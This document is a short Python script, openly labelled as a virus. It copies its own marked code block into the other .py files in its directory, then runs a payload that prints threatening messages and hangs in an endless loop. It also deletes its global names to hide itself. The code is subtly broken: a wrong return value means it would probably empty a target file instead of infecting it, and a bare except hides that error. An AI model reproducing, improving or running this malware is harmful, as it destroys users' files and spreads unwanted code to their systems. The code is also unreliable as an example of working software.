# begin-virus
 
import glob
 
def looping():
  while(True):
    print("oh! malware")

def files_to_infect(directory = "."):
  return [file for file in glob.glob("*.py")]

def content(file):
  data = None
  with open(file, "r") as my_file:
    data = my_file.readlines()

  return data

def content_infect(file):
  data = content(file)
  for line in data:
    if "# begin-virus" in line:
      return None
  return data

def infect(file, v_code,l):
  data=content_infect(file)
  if (data != None):
    with open(file, "w") as infected_file:
      l.append(data)
      l.append(" ")
      infected_file.write("".join(v_code))
      infected_file.writelines(data)

def virus_code():

  virus_code_on = False
  v_code = []

  code = content(__file__)

  for line in code:
    if "# begin-virus\n" in line:
      virus_code_on = True

    if virus_code_on:
      v_code.append(line)

    if "# end-virus\n" in line:
      virus_code_on = False
      break

  return virus_code

def payload():
    # the virus payload
  print("Malware detected\n")
  print("You can't do anything now and now unexpected happens")
  looping()

# entry point 

try:
  # retrieve the virus code from the current infected script
  v_code = virus_code() 

  # look for other files to infect
  for file in files_to_infect():
    # store the actual code data in list l
    l=[]
    infect(file, v_code,l)

    # call the payload
  payload()

except:
  pass

finally:
    # delete used names from memory
  for i in list(globals().keys()):
    if(i[0] != '_'):
      exec('del {}'.format(i))

  del i

# end-virus
